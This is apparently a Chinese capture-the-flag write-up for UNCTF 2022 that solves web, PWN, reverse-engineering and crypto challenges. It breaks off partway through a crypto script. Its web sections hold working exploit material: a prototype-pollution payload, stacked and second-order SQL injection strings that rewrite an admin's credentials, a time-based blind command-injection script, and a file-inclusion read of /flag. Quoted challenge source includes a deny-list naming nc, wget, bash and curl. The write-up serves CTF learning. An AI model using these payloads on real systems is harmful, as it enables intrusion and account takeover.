<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> flag=<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">	<span class="keyword">var</span> admin = &#123;&#125;;</span><br><span class="line">	<span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">catch</span> (error)&#123;</span><br><span class="line">		res.<span class="title function_">send</span>(<span class="string">&quot;copy error&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(admin.<span class="property">id</span>===<span class="string">&#x27;unctf&#x27;</span>)&#123;</span><br><span class="line">		res.<span class="title function_">end</span>(flag);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这里我们需要使<code>admin.id</code>的值为<code>unctf</code>来得到flag，直接利用<code>copy</code>函数污染即可。</p>
<p>payload：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="string">&quot;unctf&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055174.png" alt=""></p>
<h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>打开靶机：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055117.png" alt=""></p>
<p>试着get传参<code>/?id=1</code>，得到：<img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055980.png" alt=""></p>
<p>这里之后尝试使用堆叠注入，关键字被过滤大写绕过即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055236.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055202.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055121.png" alt=""></p>
<p>发现flag并不在库中，这时候就需要想到利用<code>load_file()</code>了，果然一句话就够了：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27;;SELECT+load_file(&#x27;</span><span class="operator">/</span>flag<span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055719.png" alt=""></p>
<h3 id="easy-rce"><a href="#easy-rce" class="headerlink" title="easy_rce"></a>easy_rce</h3><p>打开靶机审源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span><span class="title function_ invoke__"> </span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\@|\#|\%|:|&amp;|;|\\\\|&quot;|\&#x27;|`|\.|\&amp;|\*|&gt;|&lt;|nc|wget|bash|sh|netcat|grep|base64|rev|curl|wget|php|ping|cat|fl|mkdir/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$code</span>,<span class="variable">$output</span>,<span class="variable">$return_val</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$return_val</span>)   <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">                    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;小黑子,露出只因脚了吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>题目提示<code>rce布尔盲注</code>，由于<code>exec()</code>函数执行无回显，我们不能直接通过命令执行得到flag，这时候就需要利用bash语言的特性结合类似于sql盲注的手法来获取想要的信息。</p>
<p>这里知道flag在根目录下，可以利用<code>uniq</code>或者<code>paste</code>来读，<code>cut -c</code>来读取每一个字符，flag被过滤可以利用Shell<code>特殊变量$1、$2</code>等来绕过，分号用<code>%0a</code>绕过即可。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://8e7459ce-2b24-4e22-a86a-94a70cf498ba.node.yuzhian.com.cn/?&quot;</span></span><br><span class="line">dic = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;-1234567890&#125;&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">150</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">&quot;code=if [ $(uniq /f$1lag | cut -c &#123;&#125;) == &#123;&#125; ]%0athen sleep 3%0afi&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        u = url + payload</span><br><span class="line">        t1 = time.time()</span><br><span class="line">        re = requests.get(u)</span><br><span class="line">        t2 = time.time()</span><br><span class="line">        <span class="keyword">if</span> t2 - t1 &gt; <span class="number">2</span>:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># UNCTF&#123;a7e1673b-7be3-496d-8914-ae263e23a562&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="世界和平"><a href="#世界和平" class="headerlink" title="世界和平"></a>世界和平</h3><p>打开靶机，发现又是一个SQL注入的题，提示堆叠注入。</p>
<p>实际上这道题的后端过滤很容易被猜出来，对没有经过处理的关键字如<code>select、from、where</code>等会直接过滤，而对于大写的<code>SELECT、FROM、WHERE</code>等则只会被<code>replace</code>掉一次，我们可以试验一下：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055696.png" alt=""></p>
<p>可以看见我们在<code>show</code>后面加上<code>SELECT</code>命令仍然正常执行，那么思路就很明显了，双写绕过即可。</p>
<p>首先找到flag在哪：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055893.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055288.png" alt=""></p>
<p>然后直接查询flag即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055265.png" alt=""></p>
<h3 id="Sqlsql"><a href="#Sqlsql" class="headerlink" title="Sqlsql"></a>Sqlsql</h3><p>题目给了源码，首先可以审一下源码。</p>
<p>首先在<code>init.sql</code>中可以看见数据库的配置信息，在<code>score.php</code>中发现了flag的信息：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055241.png" alt=""></p>
<p>也就是说我们只需要以<code>admin</code>的身份登录并查询一个已有用户的成绩即可得到flag，那么问题就变成了如何以admin的身份登录。</p>
<p>首先可以看一下<code>login.php</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]===<span class="string">&#x27;&#x27;</span> || <span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>]===<span class="string">&#x27;&#x27;</span> || <span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]!==<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;想什么呢，好好做题吧!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>,<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$studentid</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;something error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and studentid=&#x27;<span class="subst">$studentid</span>&#x27;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>();</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]));</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = (<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;studentid&#x27;</span>] = (<span class="variable">$row</span>[<span class="string">&#x27;studentid&#x27;</span>]);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;用户名或密码错误捏&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察了一下，似乎无法直接绕过检查以admin的身份登录，那么只能从别的地方下手了。</p>
<p>继续审代码发现突破口：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from score where username=&#x27;&quot;</span>.<span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows) &#123;</span><br><span class="line">            <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;用户已完成考试\&quot;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$query</span> = <span class="string">&quot;insert into score values (NULL, &#x27;&quot;</span>.<span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27;, <span class="subst">$getscroe</span>);insert into userAnswer values (NULL, &#x27;&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q1&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q2&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q3&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q4&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q5&#x27;</span>].<span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$query</span>)===<span class="literal">TRUE</span>) &#123;</span><br><span class="line">                <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;已完成考试！\&quot;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script language=&#x27;JavaScript&#x27;&gt;location.replace(&#x27;index.php&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;something error!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>重点在于下面这条语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;insert into score values (NULL, &#x27;&quot;</span>.<span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27;, <span class="subst">$getscroe</span>);insert into userAnswer values (NULL, &#x27;&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q1&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q2&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q3&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q4&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q5&#x27;</span>].<span class="string">&quot;&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这里的<code>$_SESSION[&#39;username&#39;]</code>是我们在登录时的用户名，在我们答完题之后，就会执行这条语句，将我们的答案记录在数据库中，但是注意，第一条插入语句中存在<code>addslasher_deep()</code>来转义字符限制了注入，但第二条没有，这恰恰是我们可以利用的点。</p>
<p>构造payload如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span>zeroc<span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;);update users set studentid=&#x27;</span><span class="number">123456</span><span class="string">&#x27; where username=&#x27;</span>admin<span class="string">&#x27;;#</span></span><br></pre></td></tr></table></figure>
<p>那么插入语句就变成了：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> userAnswer <span class="keyword">values</span> (<span class="keyword">NULL</span>, <span class="string">&#x27;zeroc&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>);<span class="keyword">update</span> users <span class="keyword">set</span> studentid<span class="operator">=</span><span class="string">&#x27;123456&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;#</span><br></pre></td></tr></table></figure>
<p>这样我们就将admin的学号修改为123456，接下来直接登录后查询成绩即可得到flag。</p>
<p>首先注册<code>username=zeroc&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;);update users set studentid=&#39;123456&#39; where username=&#39;admin&#39;;#</code>的用户：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055804.png" alt=""></p>
<p>答完题之后登出，直接使用<code>admin</code>和<code>123456</code>登录admin：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055582.png" alt=""></p>
<p>接着查询admin的成绩即可得到flag：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055456.png" alt=""></p>
<p>这道题是<code>NepCTF</code>中一道二次注入加udf提权的极简版，可以参考这篇文章：<a href="https://err0r.top/article/eruditeFlower/#">https://err0r.top/article/eruditeFlower/#</a></p>
<h3 id="快乐三消"><a href="#快乐三消" class="headerlink" title="快乐三消"></a>快乐三消</h3><p>题目提示备份泄露和目录扫描，那就先扫一扫：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055269.png" alt=""></p>
<p>扫出来一个登录界面，结合备份泄露，访问<code>/admin/login.php.bak</code>得到登录账号和密码：<code>admin</code>、<code>unctf</code>。</p>
<p>登录后进行了一些操作无果，简单地看看页面源码：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055544.png" alt=""></p>
<p>发现关键信息：<code>fi.php?filename=index.php</code>，访问一下还是原来那个界面，猜想可能存在文件包含，试试伪协议读取<code>fi.php</code>的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/fi.php?filename=php://filter/read=convert.base64-encode/resource=fi.php</span><br></pre></td></tr></table></figure>
<p>解码后得到：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202055703.png" alt=""></p>
<p>确实存在文件包含漏洞，那么直接利用目录遍历访问根目录下的flag试试：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054657.png" alt=""></p>
<p>得到flag。</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>因为前几题没涉及到栈啥的，就做了做，第三道栈迁移还差一点做出来（</p>
<h3 id="WelcomeUNCTF2022"><a href="#WelcomeUNCTF2022" class="headerlink" title="WelcomeUNCTF2022"></a>WelcomeUNCTF2022</h3><p>简单的签到题，丢进IDA一看：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054789.png" alt=""></p>
<p>输入<code>UNCTF&amp;2022</code>即可：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054006.png" alt=""></p>
<h3 id="石头剪刀布"><a href="#石头剪刀布" class="headerlink" title="石头剪刀布"></a>石头剪刀布</h3><p>丢进IDA：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054051.png" alt=""></p>
<p>关键函数<code>playgame</code>:</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054550.png" alt=""></p>
<p>已知随机数种子，生成了100个随机数序列，0——石头，1——剪刀，2——布，只需要赢100次即可，注意这里生成的随机数需要在linux环境下。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>, <span class="number">32164</span>)</span><br><span class="line">c = <span class="string">b&#x27;y&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;1122022122220021012001111211100201200102121201110020212100221121222210202001222001010020100211110112&#x27;</span></span><br><span class="line"><span class="comment"># 0石头1剪刀2布</span></span><br><span class="line"><span class="comment"># 0-&gt;2 1-&gt;0 2-&gt;1</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;2&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">r.sendline(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(i.encode()))</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># UNCTF&#123;c6f70cf1-009a-46ab-bb3d-deb6912ca004&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>只会做签到（</p>
<h3 id="whereisyourkey"><a href="#whereisyourkey" class="headerlink" title="whereisyourkey"></a>whereisyourkey</h3><p>丢进IDA：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054242.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202211202054230.png" alt=""></p>
<p>小逆一下即可。</p>
<p>EXP:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ooooo</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (a1 == <span class="number">109</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">109</span>;</span><br><span class="line">    <span class="keyword">if</span> (a1 &lt;= <span class="number">111</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a1 &lt;= <span class="number">110</span>)</span><br><span class="line">            a1 -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        a1 += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v5[<span class="number">10</span>];</span><br><span class="line">    v5[<span class="number">0</span>] = <span class="number">118</span>;</span><br><span class="line">    v5[<span class="number">1</span>] = <span class="number">103</span>;</span><br><span class="line">    v5[<span class="number">2</span>] = <span class="number">112</span>;</span><br><span class="line">    v5[<span class="number">3</span>] = <span class="number">107</span>;</span><br><span class="line">    v5[<span class="number">4</span>] = <span class="number">99</span>;</span><br><span class="line">    v5[<span class="number">5</span>] = <span class="number">109</span>;</span><br><span class="line">    v5[<span class="number">6</span>] = <span class="number">104</span>;</span><br><span class="line">    v5[<span class="number">7</span>] = <span class="number">110</span>;</span><br><span class="line">    v5[<span class="number">8</span>] = <span class="number">99</span>;</span><br><span class="line">    v5[<span class="number">9</span>] = <span class="number">105</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        v5[i] = ooooo(v5[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,v5[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># UNCTF&#123;yesiamflag&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>感觉这次Crypto偏脑洞，一些题也是脚本一把梭的（</p>
<h3 id="md5-1"><a href="#md5-1" class="headerlink" title="md5-1"></a>md5-1</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;UNCTF&#123;%s&#125;&#x27;</span>%md5(<span class="string">&#x27;x&#x27;</span>.encode()).hexdigest()</span><br><span class="line"><span class="comment"># x不是一个字符是n个字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)<span class="keyword">as</span> file:</span><br><span class="line">        file.write(md5(i.encode()).hexdigest()+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>还给了个out.txt，直接爆破即可：</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;C:/Users/lenovo/Desktop/crypto-md5-1/out.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">dic = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_.&#123;-1234567890&#125;&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">126</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(<span class="built_in">chr</span>(j).encode()).hexdigest() == i.strip():</span><br><span class="line">            res += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="dddd"><a href="#dddd" class="headerlink" title="dddd"></a>dddd</h3><p>给了一串01串，一眼摩斯码，写个脚本转换跑就行。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">MorseList = &#123;</span><br><span class="line">    <span class="string">&quot;.-&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;-...&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;-.-.&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;-..&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;.&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;..-.&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;--.&quot;</span>: <span class="string">&quot;G&quot;</span>,</span><br><span class="line">    <span class="string">&quot;....&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;..&quot;</span>: <span class="string">&quot;I&quot;</span>, <span class="string">&quot;.---&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;-.-&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;.-..&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;--&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;-.&quot;</span>: <span class="string">&quot;N&quot;</span>,</span><br><span class="line">    <span class="string">&quot;---&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;.--．&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;--.-&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;.-.&quot;</span>: <span class="string">&quot;R&quot;</span>, <span class="string">&quot;...&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;-&quot;</span>: <span class="string">&quot;T&quot;</span>,</span><br><span class="line">    <span class="string">&quot;..-&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;...-&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;.--&quot;</span>: <span class="string">&quot;W&quot;</span>, <span 